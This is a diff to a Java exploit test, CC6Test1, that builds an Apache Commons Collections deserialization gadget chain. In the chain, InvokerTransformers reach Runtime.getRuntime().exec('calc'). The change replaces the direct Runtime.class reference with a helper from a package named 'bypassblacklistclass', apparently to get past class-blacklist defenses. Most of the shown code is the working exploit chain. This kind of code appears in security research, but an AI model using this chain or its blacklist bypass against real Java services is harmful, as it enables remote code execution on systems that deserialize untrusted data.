@@ -6,6 +6,7 @@ import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
+import util.bypassblacklistclass.CC;
 
 import java.io.*;
 import java.lang.reflect.Field;
@@ -17,7 +18,7 @@ public class CC6Test1 {
     public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException {
 
         Transformer[] transformers=new Transformer[]{
-                new ConstantTransformer(Runtime.class),
+                CC.getMapTransformer("Squirt1e"),
                 new InvokerTransformer("getMethod",new Class[] {String.class,Class[].class},new Object[] {"getRuntime",null}),
                 new InvokerTransformer("invoke",new Class[] {Object.class,Object[].class},new Object[] {null,null}),
                 new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}),
